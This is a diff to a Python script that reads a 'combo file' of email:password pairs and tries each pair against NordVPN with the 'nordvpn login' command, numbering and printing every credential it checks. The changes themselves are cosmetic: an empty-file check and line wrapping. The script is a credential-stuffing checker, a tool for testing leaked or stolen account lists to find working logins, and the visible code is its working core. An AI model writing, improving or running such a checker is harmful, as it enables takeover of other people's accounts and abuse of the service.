@@ -33,15 +33,16 @@ if not os.path.isfile(combo_file_path):
     print('The path specified does not exist', combo_file_path)
     sys.exit()
 
-# make sure you logged out of NordVPN
+# make sure you're logged out of NordVPN
 subprocess.run(['nordvpn', 'logout'], capture_output=True)
+
+# check if the specified file is empty
+if os.stat(combo_file_path).st_size == 0:
+    print('The file specified is empty.')
+    sys.exit()
 
 with open(combo_file_path) as combo_file:
     count = 0
-
-    if not combo_file.read().strip():
-        print('Given file is empty')
-        sys.exit()
 
     for line in combo_file:
         count += 1
@@ -49,10 +50,12 @@ with open(combo_file_path) as combo_file:
         if not line.strip():  # ignore empty lines in file
             continue
 
-        email, password = line.strip().split(':')    # your combo file must be separated by `:`
+        # your combo file must be separated by `:`
+        email, password = line.strip().split(':')
 
         # making output more user friendly
-        print(B + f'{count}) Checking ➜', W + f'{email}:{password}\r' + E, end='')
+        print(B + f'{count}) Checking ➜', W +
+              f'{email}:{password}\r' + E, end='')
 
         login_result = subprocess.run(
             ['nordvpn', 'login', '-u', email, '-p', password],
